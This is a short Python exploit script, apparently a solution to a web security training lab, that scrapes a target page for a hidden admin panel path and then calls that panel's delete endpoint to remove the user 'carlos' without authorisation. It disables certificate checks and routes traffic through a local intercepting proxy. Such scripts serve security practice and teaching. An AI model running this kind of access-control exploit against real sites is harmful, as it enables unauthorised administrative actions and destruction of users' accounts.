import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def delete_user(s, url):
    r = requests.get(url, verify=False, proxies=proxies)

    #Retrieve session cookie
    session_cookie = r.cookies.get_dict().get('session')

    #Retrieve admin panel
    print("[+] Finding admin panel...")
    soup = BeautifulSoup(r.text, 'lxml')
    admin_instances = soup.find(string=re.compile("/admin-"))
    admin_path = re.search("href', '(.*)'", admin_instances).group(1)

    #Delete carlos user
    print("[+] Deleteing carlos user...")
    cookies = {'session': session_cookie}
    delete_carlos_url = url + admin_path + '/delete?username=carlos'
    r = requests.get(delete_carlos_url, cookies=cookies, verify=False, proxies=proxies)
    if r.status_code == 200:
        print("[+] Deleted Carlos user!")
    else:
        print("[-] Unable to delete carlos.")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.argv[1]
    print("[+] Finding admin panel...")
    delete_user(s, url)

if __name__ == "__main__":
    main() 